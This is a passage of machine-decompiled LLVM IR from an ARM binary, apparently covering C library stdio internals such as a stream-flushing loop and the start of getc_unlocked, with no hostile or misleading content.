  br label %dec_label_pc_16b04

dec_label_pc_16b3c:                               ; preds = %dec_label_pc_16b34
  %v2_16b3c = icmp ne i32 %v1_16b34, 0
  store i1 %v2_16b3c, i1* %cpsr_c.global-to-local, align 1
  %v7_16b40 = icmp slt i32 %v1_16b34, 2
  br i1 %v7_16b40, label %dec_label_pc_16b5cthread-pre-split, label %dec_label_pc_16b44

dec_label_pc_16b44:                               ; preds = %dec_label_pc_16b3c
  %v0_16b44 = load i32, i32* @r7, align 4
  store i32 %v0_16b44, i32* %r0.global-to-local, align 4
  %v0_16b48 = load i32, i32* %r1.global-to-local, align 4
  %v1_16b48 = add i32 %v0_16b48, 129
  store i32 %v1_16b48, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16b5cthread-pre-split

dec_label_pc_16b5cthread-pre-split:               ; preds = %dec_label_pc_16b3c, %dec_label_pc_16b44
  %v0_16ca8.pr.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_16b5c

dec_label_pc_16b5c:                               ; preds = %dec_label_pc_16b5cthread-pre-split, %dec_label_pc_16adc
  %v0_16ca8.pr = phi i32 [ %v0_16ca8.pr.pr, %dec_label_pc_16b5cthread-pre-split ], [ %v2_16af4, %dec_label_pc_16adc ]
  store i32 92, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16ca818 = icmp eq i32 %v0_16ca8.pr, 0
  br i1 %v2_16ca818, label %dec_label_pc_16cb0, label %dec_label_pc_16b6c

dec_label_pc_16b6c:                               ; preds = %dec_label_pc_16b5c, %dec_label_pc_16ca4
  %v0_16b94 = phi i32 [ %v3_16ca4, %dec_label_pc_16ca4 ], [ %v0_16ca8.pr, %dec_label_pc_16b5c ]
  %v1_16b6c = inttoptr i32 %v0_16b94 to i16*
  %v2_16b6c = load i16, i16* %v1_16b6c, align 2
  %v3_16b6c = zext i16 %v2_16b6c to i32
  store i32 %v3_16b6c, i32* %r3.global-to-local, align 4
  %v1_16b70 = and i32 %v3_16b6c, 64
  %v2_16b70 = icmp eq i32 %v1_16b70, 0
  br i1 %v2_16b70, label %dec_label_pc_16ca4, label %dec_label_pc_16b78

dec_label_pc_16b78:                               ; preds = %dec_label_pc_16b6c
  %v0_16b78 = load i32, i32* @r6, align 4
  %v1_16b78 = load i32, i32* %sb.global-to-local, align 4
  %v2_16b78 = add i32 %v1_16b78, %v0_16b78
  %v3_16b78 = inttoptr i32 %v2_16b78 to i32*
  %v4_16b78 = load i32, i32* %v3_16b78, align 4
  store i32 %v4_16b78, i32* %r3.global-to-local, align 4
  %v1_16b7c = inttoptr i32 %v4_16b78 to i32*
  %v2_16b7c = load i32, i32* %v1_16b7c, align 4
  store i32 %v2_16b7c, i32* %r3.global-to-local, align 4
  %v2_16b80 = icmp ugt i32 %v2_16b7c, 1
  store i1 %v2_16b80, i1* %cpsr_c.global-to-local, align 1
  %v7_16b80 = icmp eq i32 %v2_16b7c, 2
  br i1 %v7_16b80, label %dec_label_pc_16be4, label %dec_label_pc_16b88

dec_label_pc_16b88:                               ; preds = %dec_label_pc_16b78
  %v1_16b88 = add i32 %v0_16b94, 64
  %v2_16b88 = inttoptr i32 %v1_16b88 to i32*
  %v3_16b88 = load i32, i32* %v2_16b88, align 4
  store i32 %v3_16b88, i32* %r3.global-to-local, align 4
  %v1_16b8c = load i32, i32* %r8.global-to-local, align 4
  %v3_16b8c = icmp uge i32 %v3_16b88, %v1_16b8c
  store i1 %v3_16b8c, i1* %cpsr_c.global-to-local, align 1
  %v9_16b8c = icmp eq i32 %v3_16b88, %v1_16b8c
  br i1 %v9_16b8c, label %dec_label_pc_16bd8, label %dec_label_pc_16b94

dec_label_pc_16b94:                               ; preds = %dec_label_pc_16b88
  %v1_16b94 = add i32 %v0_16b94, 56
  store i32 %v1_16b94, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_16b94, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_16ba486 = inttoptr i32 %v1_16b94 to i32*
  %v2_16ba487 = load i32, i32* %v1_16ba486, align 4
  store i32 %v2_16ba487, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16ba894 = icmp eq i32 %v2_16ba487, 0
  br i1 %v9_16ba894, label %dec_label_pc_16bb0, label %dec_label_pc_16bc8

dec_label_pc_16bb0:                               ; preds = %dec_label_pc_16b94, %dec_label_pc_16bb0.dec_label_pc_16ba4_crit_edge
  %v0_16bb095 = phi i32 [ %v1_16ba8.pre, %dec_label_pc_16bb0.dec_label_pc_16ba4_crit_edge ], [ 0, %dec_label_pc_16b94 ]
  store i32 %v0_16bb095, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16bc0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16bc0, label %dec_label_pc_16bc4, label %dec_label_pc_16bb0.dec_label_pc_16ba4_crit_edge

dec_label_pc_16bb0.dec_label_pc_16ba4_crit_edge:  ; preds = %dec_label_pc_16bb0
  %v0_16ba4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16ba8.pre = load i32, i32* @r4, align 4
  %v1_16ba4 = inttoptr i32 %v0_16ba4.pre to i32*
  %v2_16ba4 = load i32, i32* %v1_16ba4, align 4
  store i32 %v2_16ba4, i32* %r3.global-to-local, align 4
  %v3_16ba8 = icmp uge i32 %v2_16ba4, %v1_16ba8.pre
  store i1 %v3_16ba8, i1* %cpsr_c.global-to-local, align 1
  %v9_16ba8 = icmp eq i32 %v2_16ba4, %v1_16ba8.pre
  br i1 %v9_16ba8, label %dec_label_pc_16bb0, label %dec_label_pc_16bc8

dec_label_pc_16bc4:                               ; preds = %dec_label_pc_16bb0
  %v0_16bc4 = load i32, i32* @r4, align 4
  store i32 %v0_16bc4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16bc8

dec_label_pc_16bc8:                               ; preds = %dec_label_pc_16b94, %dec_label_pc_16bb0.dec_label_pc_16ba4_crit_edge, %dec_label_pc_16bc4
  %v0_16bc8 = phi i32 [ %v0_16bc4, %dec_label_pc_16bc4 ], [ %v2_16ba487, %dec_label_pc_16b94 ], [ %v2_16ba4, %dec_label_pc_16bb0.dec_label_pc_16ba4_crit_edge ]
  %v1_16bc8 = phi i32 [ %v0_16bc4, %dec_label_pc_16bc4 ], [ 0, %dec_label_pc_16b94 ], [ %v1_16ba8.pre, %dec_label_pc_16bb0.dec_label_pc_16ba4_crit_edge ]
  %v3_16bc8 = icmp uge i32 %v0_16bc8, %v1_16bc8
  store i1 %v3_16bc8, i1* %cpsr_c.global-to-local, align 1
  %v9_16bc8 = icmp eq i32 %v0_16bc8, %v1_16bc8
  br i1 %v9_16bc8, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_16bc8
  %v1_16bcc = load i32, i32* @r7, align 4
  store i32 %v1_16bcc, i32* %r0.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_16bc8, %bb69
  %v1_16bd0 = xor i1 %v9_16bc8, true
  call void @__pseudo_cond_branch(i1 %v1_16bd0, i32 ptrtoint (i32* @global_var_142c4.496 to i32))
  %v0_16bd4 = load i32, i32* %r8.global-to-local, align 4
  %v1_16bd4 = load i32, i32* @r5, align 4
  %v2_16bd4 = add i32 %v1_16bd4, 64
  %v3_16bd4 = inttoptr i32 %v2_16bd4 to i32*
  store i32 %v0_16bd4, i32* %v3_16bd4, align 4
  %v0_16bd8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16bd8

dec_label_pc_16bd8:                               ; preds = %dec_label_pc_16b88, %bb70
  %v0_16bd8 = phi i32 [ %v0_16b94, %dec_label_pc_16b88 ], [ %v0_16bd8.pre, %bb70 ]
  %v1_16bd8 = add i32 %v0_16bd8, 60
  %v2_16bd8 = inttoptr i32 %v1_16bd8 to i32*
  %v3_16bd8 = load i32, i32* %v2_16bd8, align 4
  %v1_16bdc = add i32 %v3_16bd8, 1
  store i32 %v1_16bdc, i32* %r3.global-to-local, align 4
  store i32 %v1_16bdc, i32* %v2_16bd8, align 4
  %v0_16be4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16be4

dec_label_pc_16be4:                               ; preds = %dec_label_pc_16b78, %dec_label_pc_16bd8
  %v0_16bfc = phi i32 [ %v0_16b94, %dec_label_pc_16b78 ], [ %v0_16be4.pre, %dec_label_pc_16bd8 ]
  %v1_16be4 = inttoptr i32 %v0_16bfc to i16*
  %v2_16be4 = load i16, i16* %v1_16be4, align 2
  %v3_16be4 = zext i16 %v2_16be4 to i32
  store i32 %stack_var_-44.1, i32* %r2.global-to-local, align 4
  %v2_16bec = or i32 %v3_16be4, %stack_var_-44.1
  %v1_16bf0 = xor i32 %v2_16bec, 320
  store i32 %v1_16bf0, i32* %r3.global-to-local, align 4
  %v1_16bf4 = and i32 %v1_16bf0, 832
  %v2_16bf4 = icmp eq i32 %v1_16bf4, 0
  br i1 %v2_16bf4, label %dec_label_pc_16bfc, label %bb71

dec_label_pc_16bfc:                               ; preds = %dec_label_pc_16be4
  store i32 %v0_16bfc, i32* %r0.global-to-local, align 4
  %v1_16c00 = call i32 @__stdio_wcommit(i32 %v0_16bfc)
  store i32 %v1_16c00, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16c04 = icmp eq i32 %v1_16c00, 0
  br i1 %v2_16c04, label %.thread6, label %.thread7

.thread6:                                         ; preds = %dec_label_pc_16bfc
  %v1_16c08 = load i32, i32* @r5, align 4
  %v2_16c08 = inttoptr i32 %v1_16c08 to i16*
  %v3_16c08 = load i16, i16* %v2_16c08, align 2
  %v4_16c08 = zext i16 %v3_16c08 to i32
  store i32 %v4_16c08, i32* %r3.global-to-local, align 4
  %v2_16c0c = add i32 %v1_16c08, 8
  %v3_16c0c = inttoptr i32 %v2_16c0c to i32*
  %v4_16c0c = load i32, i32* %v3_16c0c, align 4
  store i32 %v4_16c0c, i32* %r2.global-to-local, align 4
  %v2_16c10 = and i32 %v4_16c08, 65471
  store i32 %v2_16c10, i32* %r3.global-to-local, align 4
  %v3_16c14 = add i32 %v1_16c08, 28
  %v4_16c14 = inttoptr i32 %v3_16c14 to i32*
  store i32 %v4_16c0c, i32* %v4_16c14, align 4
  %v1_16c18 = load i32, i32* %r3.global-to-local, align 4
  %v2_16c18 = trunc i32 %v1_16c18 to i16
  %v3_16c18 = load i32, i32* @r5, align 4
  %v4_16c18 = inttoptr i32 %v3_16c18 to i16*
  store i16 %v2_16c18, i16* %v4_16c18, align 2
  br label %bb71

.thread7:                                         ; preds = %dec_label_pc_16bfc
  %v1_16c1c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_16c1c, i32* %sl.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %.thread6, %dec_label_pc_16be4, %.thread7
  %v0_16c20 = load i32, i32* @r6, align 4
  %v1_16c20 = load i32, i32* %sb.global-to-local, align 4
  %v2_16c20 = add i32 %v1_16c20, %v0_16c20
  %v3_16c20 = inttoptr i32 %v2_16c20 to i32*
  %v4_16c20 = load i32, i32* %v3_16c20, align 4
  store i32 %v4_16c20, i32* %r3.global-to-local, align 4
  %v1_16c24 = inttoptr i32 %v4_16c20 to i32*
  %v2_16c24 = load i32, i32* %v1_16c24, align 4
  store i32 %v2_16c24, i32* %r3.global-to-local, align 4
  %v2_16c28 = icmp ugt i32 %v2_16c24, 1
  store i1 %v2_16c28, i1* %cpsr_c.global-to-local, align 1
  %v7_16c28 = icmp eq i32 %v2_16c24, 2
  br i1 %v7_16c28, label %dec_label_pc_16ca4, label %dec_label_pc_16c30

dec_label_pc_16c30:                               ; preds = %bb71
  %v0_16c30 = load i32, i32* @r5, align 4
  %v1_16c30 = add i32 %v0_16c30, 60
  %v2_16c30 = inttoptr i32 %v1_16c30 to i32*
  %v3_16c30 = load i32, i32* %v2_16c30, align 4
  %v1_16c34 = add i32 %v3_16c30, -1
  store i32 %v1_16c34, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16c38 = icmp eq i32 %v1_16c34, 0
  store i32 %v1_16c34, i32* %v2_16c30, align 4
  br i1 %v2_16c38, label %dec_label_pc_16c44, label %dec_label_pc_16ca4

dec_label_pc_16c44:                               ; preds = %dec_label_pc_16c30
  %v0_16c44 = load i32, i32* %r3.global-to-local, align 4
  %v1_16c44 = load i32, i32* @r5, align 4
  %v2_16c44 = add i32 %v1_16c44, 64
  %v3_16c44 = inttoptr i32 %v2_16c44 to i32*
  store i32 %v0_16c44, i32* %v3_16c44, align 4
  %v0_16c48 = load i32, i32* @r5, align 4
  %v1_16c48 = add i32 %v0_16c48, 56
  store i32 %v1_16c48, i32* @r7, align 4
  br label %dec_label_pc_16c4c

dec_label_pc_16c4c:                               ; preds = %dec_label_pc_16c7c.dec_label_pc_16c4c_crit_edge, %dec_label_pc_16c44
  %v0_16c54 = phi i32 [ %v0_16c54.pre, %dec_label_pc_16c7c.dec_label_pc_16c4c_crit_edge ], [ %v1_16c48, %dec_label_pc_16c44 ]
  %v0_16c4c = phi i32 [ %v0_16c4c.pre, %dec_label_pc_16c7c.dec_label_pc_16c4c_crit_edge ], [ %v0_16c48, %dec_label_pc_16c44 ]
  %v1_16c4c = add i32 %v0_16c4c, 56
  %v2_16c4c = inttoptr i32 %v1_16c4c to i32*
  %v3_16c4c = load i32, i32* %v2_16c4c, align 4
  store i32 %v3_16c4c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16c54, i32* %r2.global-to-local, align 4
  %v1_16c5897 = inttoptr i32 %v0_16c54 to i32*
  %v2_16c5898 = load i32, i32* %v1_16c5897, align 4
  store i32 %v2_16c5898, i32* %r3.global-to-local, align 4
  %v3_16c5c100 = icmp uge i32 %v2_16c5898, %v3_16c4c
  store i1 %v3_16c5c100, i1* %cpsr_c.global-to-local, align 1
  %v9_16c5c106 = icmp eq i32 %v2_16c5898, %v3_16c4c
  br i1 %v9_16c5c106, label %dec_label_pc_16c64, label %dec_label_pc_16c7c

dec_label_pc_16c64:                               ; preds = %dec_label_pc_16c4c, %dec_label_pc_16c64.dec_label_pc_16c58_crit_edge
  %v0_16c64107 = phi i32 [ %v1_16c5c.pre, %dec_label_pc_16c64.dec_label_pc_16c58_crit_edge ], [ %v3_16c4c, %dec_label_pc_16c4c ]
  store i32 %v0_16c64107, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16c74 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16c74, label %dec_label_pc_16c78, label %dec_label_pc_16c64.dec_label_pc_16c58_crit_edge

dec_label_pc_16c64.dec_label_pc_16c58_crit_edge:  ; preds = %dec_label_pc_16c64
  %v0_16c58.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16c5c.pre = load i32, i32* @r4, align 4
  %v1_16c58 = inttoptr i32 %v0_16c58.pre to i32*
  %v2_16c58 = load i32, i32* %v1_16c58, align 4
  store i32 %v2_16c58, i32* %r3.global-to-local, align 4
  %v3_16c5c = icmp uge i32 %v2_16c58, %v1_16c5c.pre
  store i1 %v3_16c5c, i1* %cpsr_c.global-to-local, align 1
  %v9_16c5c = icmp eq i32 %v2_16c58, %v1_16c5c.pre
  br i1 %v9_16c5c, label %dec_label_pc_16c64, label %dec_label_pc_16c7c

dec_label_pc_16c78:                               ; preds = %dec_label_pc_16c64
  %v0_16c78 = load i32, i32* @r4, align 4
  store i32 %v0_16c78, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16c7c

dec_label_pc_16c7c:                               ; preds = %dec_label_pc_16c4c, %dec_label_pc_16c64.dec_label_pc_16c58_crit_edge, %dec_label_pc_16c78
  %v0_16c84 = phi i32 [ %v0_16c78, %dec_label_pc_16c78 ], [ %v2_16c5898, %dec_label_pc_16c4c ], [ %v2_16c58, %dec_label_pc_16c64.dec_label_pc_16c58_crit_edge ]
  %v1_16c7c = phi i32 [ %v0_16c78, %dec_label_pc_16c78 ], [ %v3_16c4c, %dec_label_pc_16c4c ], [ %v1_16c5c.pre, %dec_label_pc_16c64.dec_label_pc_16c58_crit_edge ]
  %v3_16c7c = icmp uge i32 %v0_16c84, %v1_16c7c
  store i1 %v3_16c7c, i1* %cpsr_c.global-to-local, align 1
  %v9_16c7c = icmp eq i32 %v0_16c84, %v1_16c7c
  br i1 %v9_16c7c, label %dec_label_pc_16c84, label %dec_label_pc_16c7c.dec_label_pc_16c4c_crit_edge

dec_label_pc_16c7c.dec_label_pc_16c4c_crit_edge:  ; preds = %dec_label_pc_16c7c
  %v0_16c4c.pre = load i32, i32* @r5, align 4
  %v0_16c54.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16c4c

dec_label_pc_16c84:                               ; preds = %dec_label_pc_16c7c
  %v2_16c84 = icmp ne i32 %v1_16c7c, 0
  store i1 %v2_16c84, i1* %cpsr_c.global-to-local, align 1
  %v7_16c88 = icmp slt i32 %v1_16c7c, 2
  br i1 %v7_16c88, label %dec_label_pc_16ca4, label %dec_label_pc_16c8c

dec_label_pc_16c8c:                               ; preds = %dec_label_pc_16c84
  %v0_16c8c = load i32, i32* @r5, align 4
  %v1_16c8c = add i32 %v0_16c8c, 56
  store i32 %v1_16c8c, i32* %r0.global-to-local, align 4
  %v0_16c90 = load i32, i32* %r1.global-to-local, align 4
  %v1_16c90 = add i32 %v0_16c90, 129
  store i32 %v1_16c90, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16ca4

dec_label_pc_16ca4:                               ; preds = %dec_label_pc_16c30, %dec_label_pc_16c8c, %dec_label_pc_16c84, %bb71, %dec_label_pc_16b6c
  %v0_16ca4 = load i32, i32* @r5, align 4
  %v1_16ca4 = add i32 %v0_16ca4, 32
  %v2_16ca4 = inttoptr i32 %v1_16ca4 to i32*
  %v3_16ca4 = load i32, i32* %v2_16ca4, align 4
  store i32 %v3_16ca4, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16ca8 = icmp eq i32 %v3_16ca4, 0
  br i1 %v2_16ca8, label %dec_label_pc_16cb0, label %dec_label_pc_16b6c

dec_label_pc_16cb0:                               ; preds = %dec_label_pc_16ca4, %dec_label_pc_16b5c
  %v0_16cb0 = call i32 @_stdio_openlist_dec_use()
  store i32 %v0_16cb0, i32* %r0.global-to-local, align 4
  %v0_16cec.pre = load i32, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_16cb8:                               ; preds = %dec_label_pc_16994
  %v3_16cb8 = load i16, i16* %arg1, align 2
  %v4_16cb8 = zext i16 %v3_16cb8 to i32
  %v1_16cbc = and i32 %v4_16cb8, 64
  store i32 %v1_16cbc, i32* %r3.global-to-local, align 4
  %v2_16cbc = icmp eq i32 %v1_16cbc, 0
  br i1 %v2_16cbc, label %bb72, label %dec_label_pc_16cc8

bb72:                                             ; preds = %dec_label_pc_16cb8
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_16cc8:                               ; preds = %dec_label_pc_16cb8
  %v2_16cc8 = call i32 @__stdio_wcommit(i32 %tmp)
  store i32 %v2_16cc8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16ccc = icmp eq i32 %v2_16cc8, 0
  br i1 %v2_16ccc, label %.thread14, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_16cc8
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb73

.thread14:                                        ; preds = %dec_label_pc_16cc8
  %v1_16cd0 = load i32, i32* @r4, align 4
  %v2_16cd0 = inttoptr i32 %v1_16cd0 to i16*
  %v3_16cd0 = load i16, i16* %v2_16cd0, align 2
  %v4_16cd0 = zext i16 %v3_16cd0 to i32
  store i32 %v4_16cd0, i32* %r3.global-to-local, align 4
  %v2_16cd4 = add i32 %v1_16cd0, 8
  %v3_16cd4 = inttoptr i32 %v2_16cd4 to i32*
  %v4_16cd4 = load i32, i32* %v3_16cd4, align 4
  store i32 %v4_16cd4, i32* %r2.global-to-local, align 4
  %v2_16cd8 = and i32 %v4_16cd0, 65471
  store i32 %v2_16cd8, i32* %r3.global-to-local, align 4
  %v2_16cdc = trunc i32 %v2_16cd8 to i16
  store i16 %v2_16cdc, i16* %v2_16cd0, align 2
  %v1_16ce0 = load i32, i32* %r2.global-to-local, align 4
  %v2_16ce0 = load i32, i32* @r4, align 4
  %v3_16ce0 = add i32 %v2_16ce0, 28
  %v4_16ce0 = inttoptr i32 %v3_16ce0 to i32*
  store i32 %v1_16ce0, i32* %v4_16ce0, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

bb73:                                             ; preds = %bb72, %.thread16, %dec_label_pc_16cb0, %.thread14
  %v0_16cec = phi i32 [ -1, %.thread16 ], [ 0, %bb72 ], [ %v0_16cec.pre, %dec_label_pc_16cb0 ], [ 0, %.thread14 ]
  store i32 %v0_16cec, i32* %r0.global-to-local, align 4
  store i32 %v6_16968, i32* %r5.global-to-local, align 4
  ret i32 %v0_16cec

; uselistorder directives
  uselistorder i32 %v0_16cec, { 1, 0 }
  uselistorder i32 %v3_16ca4, { 1, 2, 0 }
  uselistorder i32 %v0_16c78, { 1, 0, 2 }
  uselistorder i32 %v1_16c5c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16bfc, { 1, 0, 2 }
  uselistorder i32 %v0_16bc4, { 1, 0, 2 }
  uselistorder i32 %v1_16ba8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16b8c, { 1, 0 }
  uselistorder i32 %v0_16b30, { 1, 0, 2 }
  uselistorder i32 %v1_16b14.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16b04, { 1, 0 }
  uselistorder i32 %v0_16ac8, { 1, 0, 2 }
  uselistorder i32 %v1_16aac.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16a94, { 1, 0 }
  uselistorder i32 %v0_16a5c, { 1, 0, 2 }
  uselistorder i32 %v1_16a40.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16a30, { 1, 0 }
  uselistorder i32 %v0_169ec, { 1, 0, 2 }
  uselistorder i32 %v1_169d0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_169a8, { 2, 1, 0, 3 }
  uselistorder i32 %tmp, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3, 5, 4, 6, 8, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 7, 8, 10, 9, 55, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 56, 23, 24, 25, 26, 27, 28, 30, 29, 1, 31, 32, 33, 34, 36, 35, 2, 37, 38, 39, 40, 42, 41, 3, 43, 44, 45, 46, 48, 47, 54, 49, 50, 53, 51, 52, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 5, 3, 4, 22, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 13, 3, 4, 5, 37, 38, 6, 7, 8, 9, 10, 35, 36, 11, 12, 0, 14, 15, 16, 33, 34, 17, 18, 20, 19, 1, 21, 22, 23, 24, 39, 40, 25, 26, 27, 31, 32, 28, 29, 30 }
  uselistorder i32 92, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i32 152, { 1, 3, 2, 4, 5, 8, 6, 9, 7, 10, 0, 11, 12, 14, 13, 15, 18, 16, 19, 17, 20 }
  uselistorder i32 129, { 7, 8, 9, 5, 6, 10, 11, 0, 1, 2, 3, 4, 12, 13 }
  uselistorder i32 -61504, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 36, 32, 33 }
  uselistorder i32 -61441, { 16, 17, 18, 19, 20, 21, 12, 13, 14, 15, 22, 23, 24, 25, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 32, 26, 27, 28, 29, 30, 31 }
  uselistorder label %bb73, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_16ca4, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_16c7c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16c64, { 1, 0 }
  uselistorder label %bb71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16be4, { 1, 0 }
  uselistorder label %dec_label_pc_16bd8, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_16bc8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16bb0, { 1, 0 }
  uselistorder label %dec_label_pc_16b6c, { 1, 0 }
  uselistorder label %dec_label_pc_16b5cthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_16b34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16b1c, { 1, 0 }
  uselistorder label %dec_label_pc_16adc, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %dec_label_pc_16acc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16ab4, { 1, 0 }
  uselistorder label %dec_label_pc_16a88, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16a60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16a48, { 1, 0 }
  uselistorder label %dec_label_pc_16a00, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_169f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_169d8, { 1, 0 }
  uselistorder label %dec_label_pc_169a4, { 1, 0 }
}

define i32 @function_16d00(i32 %arg1) local_unnamed_addr {
dec_label_pc_16d00:
  %v0_16d00 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16d00, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_16d00
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_16d00, %bb
  %v10_16d10 = phi i32 [ %arg1, %dec_label_pc_16d00 ], [ 0, %bb ]
  ret i32 %v10_16d10

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_16d14 = load i32, i32* @r4, align 4
  store i32 %v3_16d14, i32* %stack_var_-12, align 4
  %v6_16d14 = load i32, i32* @r5, align 4
  %v9_16d14 = load i32, i32* @lr, align 4
  %v0_16d18 = load i32, i32* @r0, align 4
  %v1_16d18 = add i32 %v0_16d18, 16
  %v2_16d18 = inttoptr i32 %v1_16d18 to i32*
  %v3_16d18 = load i32, i32* %v2_16d18, align 4
  store i32 %v3_16d18, i32* %r2.global-to-local, align 4
  %v1_16d1c = add i32 %v0_16d18, 24
  %v2_16d1c = inttoptr i32 %v1_16d1c to i32*
  %v3_16d1c = load i32, i32* %v2_16d1c, align 4
  %v3_16d20 = icmp ult i32 %v3_16d18, %v3_16d1c
  store i32 %v0_16d18, i32* @r4, align 4
  br i1 %v3_16d20, label %bb, label %dec_label_pc_16d40

bb:                                               ; preds = %entry
  %v2_16d2c = inttoptr i32 %v3_16d18 to i8*
  %v3_16d2c = load i8, i8* %v2_16d2c, align 1
  %v4_16d2c = zext i8 %v3_16d2c to i32
  store i32 %v4_16d2c, i32* %r0.global-to-local, align 4
  %v6_16d2c = add i32 %v3_16d18, 1
  store i32 %v6_16d2c, i32* %r2.global-to-local, align 4
  store i32 %v6_16d2c, i32* %v2_16d18, align 4
  br label %dec_label_pc_16e2c

dec_label_pc_16d40:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* @r5, align 4
  %v1_16d40 = inttoptr i32 %v0_16d18 to i16*
  %v2_16d40 = load i16, i16* %v1_16d40, align 2
  %v3_16d40 = zext i16 %v2_16d40 to i32
  %v1_16d44 = and i32 %v3_16d40, 131
  %tmp25 = icmp ugt i32 %v1_16d44, 128
  br i1 %tmp25, label %dec_label_pc_16d60, label %dec_label_pc_16d50

dec_label_pc_16d50:                               ; preds = %dec_label_pc_16d40
  store i32 128, i32* @r1, align 4
  %v0_16d54 = call i32 @__stdio_trans2r_o()
  store i32 %v0_16d54, i32* %r0.global-to-local, align 4
  %v2_16d58 = icmp eq i32 %v0_16d54, 0
  br i1 %v2_16d58, label %dec_label_pc_16d50.dec_label_pc_16d60_crit_edge, label %dec_label_pc_16e28

dec_label_pc_16d50.dec_label_pc_16d60_crit_edge:  ; preds = %dec_label_pc_16d50
  %v0_16d60.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16d60

dec_label_pc_16d60:                               ; preds = %dec_label_pc_16d50.dec_label_pc_16d60_crit_edge, %dec_label_pc_16d40
